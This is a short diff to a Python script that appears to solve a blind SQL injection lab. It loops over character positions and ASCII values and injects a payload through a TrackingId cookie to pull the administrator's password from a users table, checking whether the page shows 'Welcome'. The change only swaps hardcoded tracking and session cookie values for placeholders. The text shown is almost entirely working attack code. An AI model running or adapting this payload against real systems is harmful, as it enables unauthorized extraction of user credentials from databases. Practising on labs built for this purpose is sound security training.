@@ -13,7 +13,7 @@ def sqli_password(url):
         for j in range(32,126):
             sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-            cookies = {'TrackingId': 'WmE1mQxnfEePbDl5' + sqli_payload_encoded, 'session': 'nDzRkFVDmKE6elgy7Fn1bK8bd5Ge7DAj'}
+            cookies = {'TrackingId': '<TRACKING ID GOES HERE>' + sqli_payload_encoded, 'session': '<SESSION ID GOES HERE>'}
             r = requests.get(url, cookies=cookies, verify=False)
 
             if "Welcome" not in r.text:
